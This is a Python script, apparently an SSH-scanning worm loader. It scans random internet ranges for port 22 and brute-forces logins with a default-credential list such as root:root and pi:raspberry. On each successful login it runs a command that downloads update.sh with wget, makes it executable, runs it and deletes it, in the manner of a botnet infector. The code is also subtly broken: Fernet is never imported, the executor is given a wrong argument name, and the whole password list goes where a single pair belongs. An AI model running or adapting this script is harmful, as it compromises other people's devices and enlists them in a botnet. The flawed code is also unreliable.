#!/usr/bin/env python3

import paramiko
import socket
import random
import itertools
import logging
import concurrent.futures
from time import sleep

# Configuration
LOG_FILE = "ssh_scanner.log"
VULNZ_FILE = "vulnz.txt"
MAX_THREADS = 50
SSH_TIMEOUT = 3
SCAN_TIMEOUT = 0.37
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# ASCII Art
ascii_art = """
███████╗███████╗██╗  ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗  
██╔════╝██╔════╝██║  ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║  
███████╗███████╗███████║    ███████╗██║     ███████║██╔██╗ ██║  
╚════██║╚════██║██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║  
███████║███████║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║  
╚══════╝╚══════╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  
                                                                
██████╗ ██╗   ██╗    ███████╗██╗     ███████╗███████╗██████╗ ██╗
██╔══██╗╚██╗ ██╔╝    ██╔════╝██║     ██╔════╝██╔════╝██╔══██╗██║
██████╔╝ ╚████╔╝     ███████╗██║     █████╗  █████╗  ██████╔╝██║
██╔══██╗  ╚██╔╝      ╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝ ╚═╝
██████╔╝   ██║       ███████║███████╗███████╗███████╗██║     ██╗
╚═════╝    ╚═╝       ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝
"""

# Command to be executed on successful connection
rekdevice = (
    "cd /tmp; wget http://0.0.0.0/update.sh; "
    "busybox wget http://0.0.0.0/update.sh; chmod 777 update.sh; "
    "sh update.sh; rm -f update.sh"
)

# Password list
passwords = [
    "root:root", "root:admin", "root:password", "root:default", "root:toor",
    "admin:admin", "admin:1234", "ubnt:ubnt", "vagrant:vagrant", "root:ubnt",
    "telnet:telnet", "guest:guest", "root:vagrant", "pi:raspberry", "default:",
    "admin:password", "cisco:cisco", "root:5up", "user:password", "user:user",
    "root:debian", "root:alpine", "root:ceadmin", "root:indigo", "root:linux",
    "root:rootpasswd", "root:timeserver"
]

def encrypt_data(data):
    """Encrypt data using Fernet symmetric encryption."""
    return cipher_suite.encrypt(data.encode()).decode()

def decrypt_data(data):
    """Decrypt data using Fernet symmetric encryption."""
    return cipher_suite.decrypt(data.encode()).decode()

def ssh_brute(ip, password, log_file):
    """Attempt to brute-force SSH credentials."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=password.split(":")[0], password=password.split(":")[1], timeout=SSH_TIMEOUT)
        logging.info(f"Successful login: {password}@{ip}")
        with open(log_file, "a") as fh:
            fh.write(f"{password}:{ip}\n")
        ssh.exec_command(rekdevice)
        sleep(20)
        ssh.close()
    except paramiko.AuthenticationException:
        logging.debug(f"Authentication failed for {password}@{ip}")
    except (paramiko.SSHException, socket.error) as e:
        logging.debug(f"SSH error for {ip}: {e}")
    except Exception as e:
        logging.error(f"Unexpected error for {ip}: {e}")

def is_running_ssh(ip):
    """Check if SSH is running on the given IP address."""
    try:
        with socket.create_connection((ip, 22), timeout=SCAN_TIMEOUT):
            return True
    except (socket.timeout, ConnectionRefusedError):
        return False

def ip_range(input_string):
    """Generate IP addresses within a specified range."""
    octets = input_string.split('.')
    chunks = [list(map(int, octet.split('-'))) for octet in octets]
    ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]
    addresses = ['.'.join(map(str, address)) for address in itertools.product(*ranges)]
    random.shuffle(addresses)
    return addresses

def gen_ip():
    """Generate a random IP address or Bluetooth IP address."""
    if random.random() < 0.1:  # 10% chance to generate Bluetooth IP range
        return f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
    first = random.choice(["2", "5", "31", "37", "41", "46", "50", "65", "67", "94", "95", "96", "118", "119", "122", "161", "168", "176", "178", "179", "180", "183", "185", "187", "188", "191", "198", "201"])
    return f"{first}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def hax_thread(passwords, log_file):
    """Thread function to handle SSH brute-forcing."""
    while True:
        try:
            ip = gen_ip()
            if is_running_ssh(ip):
                if is_running_ssh('.'.join(ip.split(".")[:3]) + ".2") and is_running_ssh('.'.join(ip.split(".")[:3]) + ".254"):
                    ssh_brute(ip, passwords, log_file)
                else:
                    for ip in ip_range('.'.join(ip.split(".")[:3]) + ".0-255"):
                        if is_running_ssh(ip):
                            ssh_brute(ip, passwords, log_file)
        except Exception as e:
            logging.error(f"Error in thread: {e}")

def main():
    """Main function to start threads and manage execution."""
    print(ascii_art)
    logging.info("Starting SSH Scanner...")

    # Clear log file and vulnerability file
    with open(LOG_FILE, "w") as _:
        pass
    with open(VULNZ_FILE, "w") as _:
        pass

    with concurrent.futures.ThreadPoolExecutor(max_threads=MAX_THREADS) as executor:
        futures = [executor.submit(hax_thread, passwords, VULNZ_FILE) for _ in range(MAX_THREADS)]
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()
